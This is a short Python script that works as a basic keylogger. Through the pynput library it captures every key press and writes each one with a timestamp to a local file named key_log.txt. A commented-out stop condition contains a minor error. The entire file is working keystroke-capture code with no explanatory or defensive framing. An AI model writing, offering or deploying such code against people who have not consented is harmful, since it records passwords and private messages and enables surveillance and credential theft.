from pynput.keyboard import Key, Listener
import logging

#If it has no name it gets put into an empty string
log_dir = ""

#Just a basic logging function
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:')

#monitor keyboard input
def on_press(key):
    logging.info(str(key))
    #if key == Key.esc:
        #Uncomment to stop the listener
        #return false

with Listener(on_press=on_press) as listener:
    listener.join()